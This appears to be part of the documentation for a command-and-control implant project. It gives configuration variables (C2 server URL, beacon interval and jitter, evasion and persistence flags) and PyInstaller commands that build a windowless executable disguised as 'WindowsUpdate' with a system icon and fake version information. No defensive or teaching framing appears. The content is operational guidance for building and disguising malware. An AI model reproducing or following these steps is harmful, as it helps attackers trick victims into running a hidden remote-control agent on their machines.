# TECHNICAL SPECS OF THE AGENTS

## Compilation of Agent

Compilation Steps
Before Compiling:
Edit Configuration Variables in stealth_wrapper.py:

```python
# IMPORTANT: Update these values before compiling
C2_SERVER_URL = "http://your-c2-server:5000"  # Change this to your actual C2 server URL
CHECK_INTERVAL = 45  # Time between C2 checks in seconds
JITTER = 15  # Random jitter added to interval
AGENT_PREFIX = "SHADOW"  # Prefix for agent identification
ENABLE_EVASION = True  # Enable evasion techniques
ENABLE_PERSISTENCE = False  # Keep this FALSE for initial testing
```
Ensure both files are in the same directory:
- advanced_agent.py and stealth_wrapper.py must be in the same folder
- version_info.txt (if using) should also be in this folder
## Compilation Process:
On Windows:
```bash
# Make sure PyInstaller is installed
pip install pyinstaller

# Basic compilation
pyinstaller --onefile --noconsole stealth_wrapper.py

# Enhanced compilation with disguise
pyinstaller --onefile --noconsole --name "WindowsUpdate" --icon "%SystemRoot%\System32\shell32.dll,21" --version-file version_info.txt --clean stealth_wrapper.py
```
On macOS/Linux (for testing):
```bash
# Make sure PyInstaller is installed
pip3 install pyinstaller

# Compile
python3 -m PyInstaller --onefile --noconsole stealth_wrapper.py
```

